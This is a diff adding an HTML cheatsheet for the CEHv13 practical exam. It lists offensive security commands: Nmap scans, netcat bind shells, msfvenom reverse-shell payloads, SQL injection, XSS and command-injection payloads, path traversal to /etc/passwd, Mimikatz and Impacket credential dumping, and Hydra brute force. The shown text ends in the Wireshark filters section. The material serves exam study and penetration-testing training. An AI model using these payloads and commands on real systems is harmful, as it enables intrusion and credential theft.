@@ -1,0 +1,871 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CEHv13 AI Practical — Ultimate Cheatsheet</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: Arial, Helvetica, sans-serif; background: #0d0d0d; color: #e8e8e6; font-size: 13px; line-height: 1.5; }
+  .page { max-width: 1100px; margin: 0 auto; padding: 24px 20px 48px; }
+
+  /* Header */
+  .hdr { margin-bottom: 18px; }
+  .htitle { font-size: 22px; font-weight: 700; color: #f0f0ee; letter-spacing: -0.3px; }
+  .hsub { font-size: 11px; color: #888; margin-top: 3px; font-family: monospace; }
+  .badges { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 10px; }
+  .bdg { font-size: 10px; padding: 2px 8px; border-radius: 4px; font-weight: 600; font-family: monospace; }
+  .br { background: #3a1212; color: #f08080; }
+  .bg { background: #152310; color: #7ec850; }
+  .ba { background: #2e1f05; color: #f0a840; }
+  .bb { background: #0d1e35; color: #60aaee; }
+  .bp { background: #1a1840; color: #a8a4f8; }
+  .bt { background: #082820; color: #40d4a0; }
+
+  /* Tabs */
+  .tabs { display: flex; flex-wrap: wrap; gap: 2px; margin-top: 18px; }
+  .tab { padding: 7px 13px; font-size: 11.5px; font-weight: 600; cursor: pointer; border-radius: 7px 7px 0 0;
+         border: 1px solid #333; border-bottom: none; color: #888; background: #1a1a1a; transition: background 0.12s; user-select: none; }
+  .tab:hover { background: #242424; color: #e0e0de; }
+  .tab.active { background: #1e1e1e; color: #f0f0ee; border-color: #444; }
+
+  /* Panel */
+  .panel { display: none; border: 1px solid #333; border-radius: 0 10px 10px 10px;
+           padding: 16px; background: #1a1a1a; }
+  .panel.active { display: block; }
+
+  /* Cards */
+  .card { background: #1e1e1e; border: 1px solid #2e2e2e; border-radius: 10px; padding: 12px 14px; margin-bottom: 10px; }
+  .ct { font-size: 12px; font-weight: 700; color: #f0f0ee; margin-bottom: 8px; display: flex; align-items: center; gap: 7px; }
+  .dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+  .dg { background: #7ec850; } .db { background: #60aaee; } .da { background: #f0a840; }
+  .dr { background: #f07060; } .dp { background: #a8a4f8; } .dt { background: #40d4a0; }
+  .dc { background: #f0854a; } .dgr { background: #909090; }
+
+  /* Code blocks */
+  .cb { background: #111111; border-left: 3px solid #444; border-radius: 0 5px 5px 0;
+        padding: 8px 10px; font-size: 11px; font-family: 'Courier New', monospace; color: #c8e0b0;
+        line-height: 1.75; margin: 6px 0; white-space: pre-wrap; word-break: break-all; }
+
+  /* Tips */
+  .tip { font-size: 11px; color: #aaa; line-height: 1.6; margin-top: 6px; }
+  .tip strong { color: #e0e0de; }
+
+  /* Grid */
+  .r2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+  @media (max-width: 700px) { .r2 { grid-template-columns: 1fr; } }
+
+  /* Tables */
+  table { width: 100%; border-collapse: collapse; font-size: 10.5px; }
+  th { text-align: left; font-size: 9.5px; font-weight: 700; color: #888; padding: 4px 6px;
+       border-bottom: 1px solid #333; text-transform: uppercase; letter-spacing: 0.4px;
+       background: #161616; }
+  td { padding: 5px 6px; color: #d8d8d6; border-bottom: 1px solid #2a2a2a; vertical-align: top; font-family: monospace; font-size: 10px; }
+  tr:last-child td { border-bottom: none; }
+  td:first-child { color: #999; font-family: Arial, sans-serif; font-size: 10px; }
+  tr:nth-child(even) { background: #1a1a1a; }
+
+  /* Section labels */
+  .sl { font-size: 9.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.9px;
+        color: #666; margin: 16px 0 8px; }
+  .div { height: 1px; background: #2a2a2a; margin: 14px 0; }
+  .ic { background: #111; border-radius: 3px; padding: 1px 5px; font-family: monospace;
+        font-size: 10px; color: #c8e0b0; border: 1px solid #444; }
+
+  /* Print */
+  @media print {
+    body { background: #000; color: #fff; }
+    .tab { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    .panel { display: block !important; border: none; page-break-before: always; }
+    .panel:first-of-type { page-break-before: avoid; }
+    .tabs { display: none; }
+    .panel-title { display: block; font-size: 16px; font-weight: 700; margin: 16px 0 10px;
+                   padding-bottom: 6px; border-bottom: 2px solid #666; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+<div class="hdr">
+  <div class="htitle">CEHv13 AI Practical — Ultimate Cheatsheet</div>
+  <div class="hsub">EC-Council · 6 hrs · 20 tasks · 70% to pass · Kali Linux environment</div>
+  <div class="badges">
+    <span class="bdg br">Nmap</span><span class="bdg bb">Metasploit</span><span class="bdg bg">Wireshark</span>
+    <span class="bdg ba">Hashcat</span><span class="bdg bp">SQLMap</span><span class="bdg bt">Burp Suite</span>
+    <span class="bdg br">Nikto</span><span class="bdg bb">Hydra</span><span class="bdg bg">Aircrack-ng</span>
+    <span class="bdg ba">John</span><span class="bdg bp">OpenVAS</span><span class="bdg bt">CrackMapExec</span>
+    <span class="bdg br">Mimikatz</span><span class="bdg bb">Impacket</span>
+  </div>
+</div>
+
+<div class="tabs">
+  <div class="tab active" onclick="sw('tools',this)">Tools &amp; Scan Types</div>
+  <div class="tab" onclick="sw('recon',this)">Recon &amp; Enum</div>
+  <div class="tab" onclick="sw('exploit',this)">Exploitation</div>
+  <div class="tab" onclick="sw('web',this)">Web Attacks</div>
+  <div class="tab" onclick="sw('pw',this)">Password Cracking</div>
+  <div class="tab" onclick="sw('net',this)">Network &amp; Wireless</div>
+  <div class="tab" onclick="sw('openvas',this)">OpenVAS</div>
+  <div class="tab" onclick="sw('ai',this)">AI in CEHv13</div>
+  <div class="tab" onclick="sw('post',this)">Post-Exploit</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ TOOLS & SCANS -->
+<div id="p-tools" class="panel active">
+  <div class="sl">Nmap scan types</div>
+  <div class="card">
+    <div class="ct"><span class="dot dr"></span>All scan modes</div>
+    <table>
+      <tr><th>Flag</th><th>Scan type</th><th>How it works</th><th>When to use</th></tr>
+      <tr><td>-sS</td><td>SYN / stealth</td><td>Send SYN, don't complete handshake</td><td>Default — fast and stealthy</td></tr>
+      <tr><td>-sT</td><td>TCP connect</td><td>Full 3-way handshake via OS</td><td>No root privileges available</td></tr>
+      <tr><td>-sU</td><td>UDP scan</td><td>UDP packets, watch for ICMP unreachable</td><td>DNS 53, SNMP 161, TFTP</td></tr>
+      <tr><td>-sA</td><td>ACK scan</td><td>Send ACK — detects firewall rules only</td><td>Map firewall rulesets</td></tr>
+      <tr><td>-sN</td><td>NULL scan</td><td>No flags set — RST from closed ports</td><td>Firewall evasion (Linux targets)</td></tr>
+      <tr><td>-sF</td><td>FIN scan</td><td>FIN flag only</td><td>Firewall evasion (Linux targets)</td></tr>
+      <tr><td>-sX</td><td>Xmas scan</td><td>FIN+PSH+URG flags</td><td>Firewall evasion (Linux targets)</td></tr>
+      <tr><td>-sI</td><td>Idle / zombie</td><td>Use third-party zombie host IP ID</td><td>Completely blind/anonymous scan</td></tr>
+      <tr><td>-sV</td><td>Version detection</td><td>Banner grab + probe matching</td><td>Always combine with -sS</td></tr>
+      <tr><td>-O</td><td>OS detection</td><td>TCP/IP stack fingerprinting</td><td>Identify OS before exploitation</td></tr>
+      <tr><td>-sn</td><td>Ping sweep</td><td>ICMP echo — no port scan</td><td>Host discovery only</td></tr>
+      <tr><td>-A</td><td>Aggressive</td><td>-sV + -O + scripts + traceroute</td><td>All-in-one, noisy</td></tr>
+    </table>
+  </div>
+  <div class="card">
+    <div class="ct"><span class="dot dr"></span>Nmap essential commands</div>
+    <div class="cb">nmap -sS -sV -O &lt;target&gt;               # SYN + version + OS detection
+nmap -sS -sV -A -T4 &lt;target&gt;           # Aggressive (all-in-one)
+nmap -p- &lt;target&gt;                       # All 65535 ports
+nmap -p 22,80,443 &lt;target&gt;             # Specific ports
+nmap -sU -p 53,161 &lt;target&gt;            # UDP scan
+nmap -sn 192.168.1.0/24               # Ping sweep / host discovery
+nmap --script vuln &lt;target&gt;           # Run vulnerability scripts
+nmap --script=banner &lt;target&gt;         # Banner grab
+nmap -oN out.txt -oX out.xml &lt;target&gt; # Save output (normal + XML)
+nmap -D RND:10 &lt;target&gt;               # Decoy scan (evasion)
+nmap -T0 --max-retries 1 &lt;target&gt;     # Paranoid/stealthy</div>
+    <p class="tip"><strong>Speed -T0–T5:</strong> T0 paranoid · T1 sneaky · T2 polite · T3 normal · T4 aggressive · T5 insane</p>
+  </div>
+  <div class="div"></div>
+  <div class="sl">Tool reference map</div>
+  <div class="r2">
+    <div class="card">
+      <div class="ct"><span class="dot db"></span>Tool → purpose</div>
+      <table>
+        <tr><th>Tool</th><th>Category</th><th>Primary use</th></tr>
+        <tr><td>Nmap</td><td>Recon</td><td>Port scan, OS/version detect</td></tr>
+        <tr><td>Netdiscover</td><td>Recon</td><td>ARP-based host discovery</td></tr>
+        <tr><td>theHarvester</td><td>OSINT</td><td>Emails, subdomains, IPs</td></tr>
+        <tr><td>Wireshark</td><td>Sniffing</td><td>Packet capture &amp; analysis</td></tr>
+        <tr><td>tcpdump</td><td>Sniffing</td><td>CLI packet capture</td></tr>
+        <tr><td>Metasploit</td><td>Exploit</td><td>Framework for known CVEs</td></tr>
+        <tr><td>msfvenom</td><td>Exploit</td><td>Payload generation</td></tr>
+        <tr><td>Burp Suite</td><td>Web</td><td>Web proxy, intercept, fuzz</td></tr>
+        <tr><td>SQLMap</td><td>Web</td><td>Automated SQL injection</td></tr>
+        <tr><td>Nikto</td><td>Web</td><td>Web server scanner</td></tr>
+        <tr><td>Gobuster / dirb</td><td>Web</td><td>Directory brute-force</td></tr>
+        <tr><td>Hashcat</td><td>Password</td><td>GPU offline hash cracking</td></tr>
+        <tr><td>John the Ripper</td><td>Password</td><td>CPU offline hash cracking</td></tr>
+        <tr><td>Hydra</td><td>Password</td><td>Online brute-force</td></tr>
+        <tr><td>Medusa</td><td>Password</td><td>Online brute-force (parallel)</td></tr>
+        <tr><td>Aircrack-ng</td><td>Wireless</td><td>WPA2 handshake cracking</td></tr>
+        <tr><td>Arpspoof</td><td>Network</td><td>ARP poisoning / MITM</td></tr>
+        <tr><td>enum4linux</td><td>Enum</td><td>SMB/Samba enumeration</td></tr>
+        <tr><td>CrackMapExec</td><td>AD</td><td>SMB spray, pass-the-hash</td></tr>
+        <tr><td>Impacket</td><td>AD</td><td>Kerberoast, secretsdump</td></tr>
+        <tr><td>Mimikatz</td><td>AD</td><td>Credential extraction</td></tr>
+        <tr><td>OpenVAS / GVM</td><td>Vuln scan</td><td>Vulnerability assessment</td></tr>
+        <tr><td>SET</td><td>Social eng</td><td>Phishing, credential harvest</td></tr>
+        <tr><td>Steghide</td><td>Stego</td><td>Hide/extract data in images</td></tr>
+        <tr><td>Volatility</td><td>Forensics</td><td>Memory forensics</td></tr>
+      </table>
+    </div>
+    <div class="card">
+      <div class="ct"><span class="dot dp"></span>CEH hacking phases</div>
+      <table>
+        <tr><th>Phase</th><th>Goal</th><th>Key tools</th></tr>
+        <tr><td>1. Recon</td><td>Passive info gathering</td><td>WHOIS, theHarvester, Google dorks</td></tr>
+        <tr><td>2. Scanning</td><td>Active discovery</td><td>Nmap, Netdiscover, OpenVAS</td></tr>
+        <tr><td>3. Enumeration</td><td>Extract services/users</td><td>enum4linux, snmpwalk, smtp-user-enum</td></tr>
+        <tr><td>4. Exploitation</td><td>Gain access</td><td>Metasploit, SQLMap, Burp</td></tr>
+        <tr><td>5. Priv escalation</td><td>Gain root/SYSTEM</td><td>local_exploit_suggester, SUID</td></tr>
+        <tr><td>6. Persistence</td><td>Maintain access</td><td>Cron, registry, backdoors</td></tr>
+        <tr><td>7. Covering tracks</td><td>Remove evidence</td><td>wevtutil, history -c</td></tr>
+      </table>
+      <div class="div"></div>
+      <div class="ct"><span class="dot da"></span>Netcat — Swiss army knife</div>
+      <div class="cb">nc -lvnp 4444                    # Listener (catch reverse shell)
+nc -nv &lt;target&gt; 80              # Banner grab
+nc -zv &lt;target&gt; 20-80           # Port scan (basic)
+nc -lvnp 4444 &gt; recv.txt        # Receive file
+nc &lt;ip&gt; 4444 &lt; file.txt         # Send file
+nc -lvnp 4444 -e /bin/bash      # Bind shell (Linux)
+nc -lvnp 4444 -e cmd.exe        # Bind shell (Windows)</div>
+      <div class="div"></div>
+      <div class="ct"><span class="dot da"></span>Google dorks</div>
+      <div class="cb">site:target.com filetype:pdf
+intitle:"index of" "backup"
+inurl:admin login
+site:target.com intext:password
+"confidential" filetype:xls site:target.com
+inurl:phpinfo.php site:target.com</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ RECON & ENUM -->
+<div id="p-recon" class="panel">
+  <div class="r2">
+    <div class="card">
+      <div class="ct"><span class="dot dr"></span>Active enumeration</div>
+      <div class="cb">netdiscover -i eth0 -r 192.168.1.0/24
+enum4linux -a &lt;target&gt;              # SMB full enum
+smbclient -L \\&lt;target&gt; -U ""       # List shares (anon)
+smbclient \\&lt;target&gt;\&lt;share&gt; -U &lt;u&gt; # Connect to share
+smbmap -H &lt;target&gt;                   # Shares + permissions
+rpcclient -U "" &lt;target&gt;             # RPC enumeration
+snmpwalk -v2c -c public &lt;target&gt;    # SNMP OIDs
+smtp-user-enum -M VRFY -U users.txt -t &lt;target&gt;</div>
+    </div>
+    <div class="card">
+      <div class="ct"><span class="dot db"></span>Passive recon (OSINT)</div>
+      <div class="cb">theHarvester -d &lt;domain&gt; -b all    # Emails, hosts, IPs
+whois &lt;domain&gt;                     # Domain registration info
+maltego                            # Graph-based OSINT
+recon-ng                           # Modular recon framework
+# Shodan filters: port:22 country:CH org:"Target Corp"</div>
+    </div>
+  </div>
+  <div class="r2">
+    <div class="card">
+      <div class="ct"><span class="dot dg"></span>DNS recon</div>
+      <div class="cb">nslookup -type=ANY &lt;domain&gt;
+dig &lt;domain&gt; ANY
+dig axfr @&lt;nameserver&gt; &lt;domain&gt;   # Zone transfer
+fierce --domain &lt;domain&gt;
+dnsenum &lt;domain&gt;
+dnsrecon -d &lt;domain&gt; -t axfr</div>
+    </div>
+    <div class="card">
+      <div class="ct"><span class="dot da"></span>Banner grabbing</div>
+      <div class="cb">nc -nv &lt;target&gt; 80
+telnet &lt;target&gt; 25
+curl -I http://&lt;target&gt;
+openssl s_client -connect &lt;target&gt;:443
+nmap -sV --script=banner &lt;target&gt;</div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="ct"><span class="dot dp"></span>Port states &amp; attack surface</div>
+    <div class="r2">
+      <table>
+        <tr><th>State</th><th>Meaning</th></tr>
+        <tr><td>open</td><td>Service listening — enumerate further</td></tr>
+        <tr><td>closed</td><td>Reachable, nothing bound</td></tr>
+        <tr><td>filtered</td><td>Firewall dropping packets</td></tr>
+        <tr><td>unfiltered</td><td>Accessible, state unknown (ACK scan)</td></tr>
+      </table>
+      <table>
+        <tr><th>Port</th><th>Service</th><th>Attack surface</th></tr>
+        <tr><td>21</td><td>FTP</td><td>Anon login, cleartext, brute</td></tr>
+        <tr><td>22</td><td>SSH</td><td>Brute-force (Hydra), weak keys</td></tr>
+        <tr><td>23</td><td>Telnet</td><td>Cleartext sniff, brute-force</td></tr>
+        <tr><td>25</td><td>SMTP</td><td>VRFY user enum, open relay</td></tr>
+        <tr><td>53</td><td>DNS</td><td>Zone transfer, cache poison</td></tr>
+        <tr><td>80/443</td><td>HTTP/S</td><td>Web attacks, Nikto, Burp</td></tr>
+        <tr><td>139/445</td><td>SMB</td><td>EternalBlue, enum4linux</td></tr>
+        <tr><td>161</td><td>SNMP</td><td>Community string enum</td></tr>
+        <tr><td>3306</td><td>MySQL</td><td>SQLMap, default creds</td></tr>
+        <tr><td>3389</td><td>RDP</td><td>BlueKeep, brute-force</td></tr>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ EXPLOITATION -->
+<div id="p-exploit" class="panel">
+  <div class="r2">
+    <div class="card">
+      <div class="ct"><span class="dot dr"></span>Metasploit workflow</div>
+      <div class="cb">msfconsole
+search &lt;keyword/CVE&gt;
+use &lt;module_path&gt;
+show options
+set RHOSTS &lt;target&gt;
+set LHOST &lt;your_ip&gt;
+set LPORT 4444
+run / exploit
+sessions -l
+sessions -i &lt;id&gt;
+background</div>
+    </div>
+    <div class="card">
+      <div class="ct"><span class="dot db"></span>Key MSF modules</div>
+      <table>
+        <tr><th>Module</th><th>Use</th></tr>
+        <tr><td>exploit/multi/handler</td><td>Catch reverse shells</td></tr>
+        <tr><td>exploit/windows/smb/ms17_010_eternalblue</td><td>EternalBlue RCE</td></tr>
+        <tr><td>auxiliary/scanner/smb/smb_ms17_010</td><td>Check MS17-010 vuln</td></tr>
+        <tr><td>post/multi/recon/local_exploit_suggester</td><td>Priv-esc hints</td></tr>
+        <tr><td>post/windows/gather/hashdump</td><td>SAM hash dump</td></tr>
+        <tr><td>auxiliary/scanner/ftp/anonymous</td><td>FTP anon login check</td></tr>
+        <tr><td>auxiliary/scanner/portscan/tcp</td><td>TCP port scan</td></tr>
+      </table>
+    </div>
+  </div>
+  <div class="r2">
+    <div class="card">
+      <div class="ct"><span class="dot dg"></span>Msfvenom payloads</div>
+      <div class="cb">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=4444 -f exe -o shell.exe
+msfvenom -p php/reverse_php LHOST=&lt;ip&gt; LPORT=4444 -f raw -o shell.php
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=4444 -f elf -o shell.elf
+msfvenom -l payloads | grep windows  # List available payloads</div>
+    </div>
+    <div class="card">
+      <div class="ct"><span class="dot da"></span>Privilege escalation</div>
+      <div class="cb"># Windows
+whoami /priv
+systeminfo
+wmic qfe list           # Missing patches
+
+# Linux
+sudo -l
+find / -perm -4000 2>/dev/null  # SUID files
+uname -a
+id; cat /etc/shadow</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ WEB ATTACKS -->
+<div id="p-web" class="panel">
+  <div class="r2">
+    <div class="card">
+      <div class="ct"><span class="dot dp"></span>SQL injection — SQLMap</div>
+      <div class="cb">sqlmap -u "http://&lt;t&gt;/page.php?id=1" --dbs
+sqlmap -u "http://&lt;t&gt;/page.php?id=1" -D &lt;db&gt; --tables
+sqlmap -u "http://&lt;t&gt;/page.php?id=1" -D &lt;db&gt; -T &lt;tbl&gt; --dump
+sqlmap -u "http://&lt;t&gt;/login" --data="u=a&amp;p=b" --dbs
+sqlmap -u "http://&lt;t&gt;/page.php?id=1" --os-shell  # OS shell if possible
+
+# Manual login bypass payloads
+' OR '1'='1' --
+' OR 1=1 --
+admin'--
+" OR ""="</div>
+    </div>
+    <div class="card">
+      <div class="ct"><span class="dot dr"></span>XSS &amp; other injections</div>
+      <div class="cb"># Reflected XSS
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+# Command injection
+; ls -la
+&amp;&amp; whoami
+| cat /etc/passwd
+`id`
+
+# LFI / path traversal
+?file=../../../../etc/passwd
+?file=php://filter/convert.base64-encode/resource=index.php
+
+# File upload bypass
+shell.php → change MIME to image/jpeg in Burp</div>
+    </div>
+  </div>
+  <div class="r2">
+    <div class="card">
+      <div class="ct"><span class="dot db"></span>Nikto &amp; directory brute</div>
+      <div class="cb">nikto -h http://&lt;target&gt;
+nikto -h https://&lt;target&gt; -port 443 -ssl
+dirb http://&lt;target&gt; /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://&lt;target&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt</div>
+    </div>
+    <div class="card">
+      <div class="ct"><span class="dot dt"></span>Burp Suite workflow</div>
+      <p class="tip"><strong>1.</strong> Proxy → browser → 127.0.0.1:8080<br><strong>2.</strong> Intercept → modify parameters<br><strong>3.</strong> Ctrl+R → Repeater for manual testing<br><strong>4.</strong> Ctrl+I → Intruder for fuzzing/brute-force<br><strong>5.</strong> Decoder tab → encode/decode base64, URL, hex</p>
+    </div>
+  </div>
+  <div class="card">
+    <div class="ct"><span class="dot da"></span>OWASP Top 10 — exam context</div>
+    <table>
+      <tr><th>#</th><th>Vulnerability</th><th>How to test</th></tr>
+      <tr><td>A01</td><td>Broken Access Control</td><td>IDOR, path traversal, force-browse /admin</td></tr>
+      <tr><td>A02</td><td>Cryptographic Failures</td><td>HTTP vs HTTPS, MD5/SHA1 hashes, cleartext storage</td></tr>
+      <tr><td>A03</td><td>Injection</td><td>SQLMap, manual payloads, command injection</td></tr>
+      <tr><td>A05</td><td>Security Misconfiguration</td><td>Nikto, default creds, verbose errors, open CORS</td></tr>
+      <tr><td>A07</td><td>Auth Failures</td><td>Hydra brute-force, Burp Intruder, weak passwords</td></tr>
+      <tr><td>A08</td><td>Software &amp; Data Integrity</td><td>Check update mechanisms, unsigned packages</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ PASSWORD CRACKING -->
+<div id="p-pw" class="panel">
+  <div class="sl">Decision flow — which tool to use</div>
+  <div class="card">
+    <div class="ct"><span class="dot dgr"></span>Tool selection guide</div>
+    <table>
+      <tr><th>Situation</th><th>Tool</th><th>Attack type</th></tr>
+      <tr><td>Have hash file (offline)</td><td>Hashcat / John the Ripper</td><td>Dictionary / brute-force / rules</td></tr>
+      <tr><td>Live service (SSH, FTP, HTTP…)</td><td>Hydra / Medusa</td><td>Online brute-force</td></tr>
+      <tr><td>Windows AD / SMB</td><td>CrackMapExec / Impacket</td><td>Pass-the-hash / password spray</td></tr>
+      <tr><td>WPA2 handshake .cap file</td><td>Aircrack-ng / Hashcat -m 22000</td><td>Dictionary vs handshake</td></tr>
+      <tr><td>Identify hash type first</td><td>hashid / hash-identifier</td><td>Identification only</td></tr>
+      <tr><td>Extract Windows hashes</td><td>Mimikatz / samdump2 / MSF hashdump</td><td>Extraction then crack offline</td></tr>
+    </table>
+  </div>
+  <div class="div"></div>
+  <div class="sl">Hash identification &amp; extraction</div>
+  <div class="r2">
+    <div class="card">
+      <div class="ct"><span class="dot dg"></span>Identify &amp; extract hashes</div>
+      <div class="cb">hashid 'hash_value_here'
+hash-identifier            # interactive mode
+
+# Linux — always unshadow first
+unshadow /etc/passwd /etc/shadow > combined.txt
+
+# Windows SAM (offline, copy hives first)
+samdump2 SYSTEM SAM > hashes.txt
+
+# Metasploit / Meterpreter
+hashdump
+run post/windows/gather/hashdump
+
+# Mimikatz (Windows shell with admin)
+privilege::debug
+sekurlsa::logonpasswords
+lsadump::sam</div>
+    </div>
+    <div class="card">
+      <div class="ct"><span class="dot dg"></span>Hash mode table (Hashcat -m)</div>
+      <table>
+        <tr><th>Hash type</th><th>-m</th><th>Prefix / length</th></tr>
+        <tr><td>MD5</td><td>0</td><td>32 hex chars</td></tr>
+        <tr><td>SHA1</td><td>100</td><td>40 hex chars</td></tr>
+        <tr><td>SHA256</td><td>1400</td><td>64 hex chars</td></tr>
+        <tr><td>NTLM</td><td>1000</td><td>32 hex chars</td></tr>
+        <tr><td>NTLMv2</td><td>5600</td><td>varies (net capture)</td></tr>
+        <tr><td>sha512crypt (Linux)</td><td>1800</td><td>$6$…</td></tr>
+        <tr><td>md5crypt (Linux)</td><td>500</td><td>$1$…</td></tr>
+        <tr><td>bcrypt</td><td>3200</td><td>$2a$… or $2b$…</td></tr>
+        <tr><td>WPA2 PMKID/handshake</td><td>22000</td><td>.hc22000 file</td></tr>
+        <tr><td>Kerberos TGS (Kerberoast)</td><td>13100</td><td>$krb5tgs$…</td></tr>
+        <tr><td>AS-REP (ASREPRoast)</td><td>18200</td><td>$krb5asrep$…</td></tr>
+        <tr><td>MySQL 4.1+</td><td>300</td><td>*+41 chars</td></tr>
+      </table>
+    </div>
+  </div>
+  <div class="div"></div>
+  <div class="sl">Hashcat — GPU-accelerated offline cracking</div>
+  <div class="card">
+    <div class="ct"><span class="dot dr"></span>Hashcat — full reference</div>
+    <div class="cb">hashcat -m 0    hash.txt rockyou.txt              # MD5 dictionary
+hashcat -m 1000 hash.txt rockyou.txt              # NTLM dictionary
+hashcat -m 1800 hash.txt rockyou.txt              # sha512crypt (Linux $6$)
+hashcat -m 3200 hash.txt rockyou.txt              # bcrypt
+hashcat -m 22000 cap.hc22000 rockyou.txt          # WPA2
+
+# Attack modes (-a)
+hashcat -m 0 -a 0 hash.txt wordlist.txt           # -a 0  dictionary
+hashcat -m 0 -a 1 hash.txt w1.txt w2.txt          # -a 1  combination
+hashcat -m 0 -a 3 hash.txt ?u?l?l?l?d?d          # -a 3  brute/mask
+hashcat -m 0 -a 6 hash.txt wordlist.txt ?d?d?d    # -a 6  hybrid word+mask
+
+# Rules (mangling — fastest practical approach)
+hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/dive.rule
+
+# Mask charset: ?l=lowercase ?u=uppercase ?d=digit ?s=special ?a=all
+# Key flags: -O optimised kernels  --force ignore warnings (VM)
+#            --show display cracked  -o out.txt save cracked results
+#            --status live progress  --session name  --restore resume</div>
+  </div>
+  <div class="div"></div>
+  <div class="sl">John the Ripper</div>
+  <div class="card">
+    <div class="ct"><span class="dot da"></span>John commands</div>
+    <div class="cb">john hash.txt                              # auto-detect format + crack
+john --wordlist=rockyou.txt hash.txt       # dictionary attack
+john --wordlist=rockyou.txt --rules hash.txt  # dictionary + mangling rules
+john --format=NT hash.txt                  # force NTLM format
+john --format=sha512crypt hash.txt         # Linux $6$ shadow
+john --incremental hash.txt               # pure brute-force
+john --single hash.txt                    # use username as base word
+john --show hash.txt                      # display all cracked
+john --restore                            # resume interrupted session
+
+# Linux full workflow
+unshadow /etc/passwd /etc/shadow > combined.txt
+john combined.txt --wordlist=rockyou.txt
+john --show combined.txt</div>
+  </div>
+  <div class="div"></div>
+  <div class="sl">Online brute-force — Hydra &amp; Medusa</div>
+  <div class="card">
+    <div class="ct"><span class="dot db"></span>Hydra — all protocols</div>
+    <div class="cb">hydra -l root -P rockyou.txt ssh://&lt;target&gt;
+hydra -l admin -P rockyou.txt ftp://&lt;target&gt;
+hydra -l admin -P rockyou.txt rdp://&lt;target&gt;
+hydra -l root -P rockyou.txt mysql://&lt;target&gt;
+hydra -L users.txt -P rockyou.txt smb://&lt;target&gt;
+hydra -l admin -P rockyou.txt http-get://&lt;target&gt;/admin
+hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&amp;pass=^PASS^:Invalid"
+# Flags: -l user  -L user-list  -p pass  -P pass-list
+#        -t threads (def 16)  -f stop on first hit  -vV verbose  -s custom port</div>
+  </div>
+  <div class="card">
+    <div class="ct"><span class="dot dt"></span>Medusa</div>
+    <div class="cb">medusa -h &lt;target&gt; -u admin -P rockyou.txt -M ssh
+medusa -h &lt;target&gt; -u admin -P rockyou.txt -M ftp
+medusa -h &lt;target&gt; -u admin -P rockyou.txt -M http -m DIR:/admin
+medusa -h &lt;target&gt; -U users.txt -P rockyou.txt -M smb -t 10</div>
+  </div>
+  <div class="div"></div>
+  <div class="sl">Windows AD attacks</div>
+  <div class="r2">
+    <div class="card">
+      <div class="ct"><span class="dot dp"></span>CrackMapExec</div>
+      <div class="cb">crackmapexec smb &lt;target&gt; -u admin -p Password123
+crackmapexec smb 192.168.1.0/24 -u users.txt -p pass.txt
+crackmapexec smb &lt;target&gt; -u admin -H &lt;NTLM_hash&gt;  # Pass-the-hash
+crackmapexec smb &lt;target&gt; -u admin -p pass --sam    # Dump SAM
+crackmapexec smb &lt;target&gt; -u admin -p pass --lsa    # Dump LSA</div>
+    </div>
+    <div class="card">
+      <div class="ct"><span class="dot dp"></span>Impacket</div>
+      <div class="cb">impacket-secretsdump domain/admin:pass@&lt;target&gt;
+impacket-secretsdump -hashes :NTLM admin@&lt;target&gt;
+impacket-psexec domain/admin:pass@&lt;target&gt;
+# Kerberoasting → hashcat -m 13100
+impacket-GetUserSPNs domain/user:pass -dc-ip &lt;dc&gt; -request
+# ASREPRoasting → hashcat -m 18200
+impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip &lt;dc&gt;</div>
+    </div>
+  </div>
+  <div class="div"></div>
+  <div class="sl">Wordlist generation</div>
+  <div class="card">
+    <div class="ct"><span class="dot dg"></span>Wordlists &amp; custom generation</div>
+    <div class="cb">gunzip /usr/share/wordlists/rockyou.txt.gz       # Decompress rockyou
+/usr/share/wordlists/fasttrack.txt                # Common passwords
+/usr/share/hashcat/rules/best64.rule              # Best rule file
+/usr/share/hashcat/rules/dive.rule                # Most thorough rules
+
+cewl http://target.com -m 6 -w custom.txt        # Scrape wordlist from site
+crunch 8 8 -t Pass@@@@ -o out.txt               # Pattern: 4-digit suffix
+crunch 6 10 abc123 -o out.txt                    # 6-10 chars from charset</div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ NETWORK & WIRELESS -->
+<div id="p-net" class="panel">
+  <div class="r2">
+    <div class="card">
+      <div class="ct"><span class="dot dt"></span>Wireshark display filters</div>
+      <div class="cb">http                            # All HTTP traffic
+ftp                             # FTP traffic
+tcp.port == 80                  # By port number
+ip.addr == 192.168.1.10        # By IP address
+tcp.flags.syn == 1             # SYN packets only
+http.request.method == "POST"  # HTTP POST requests
+ftp.request.command == "PASS"  # FTP password capture
+tcp contains "password"        # String search in payload
+icmp                           # Ping / ICMP traffic
+dns                            # DNS queries</div>
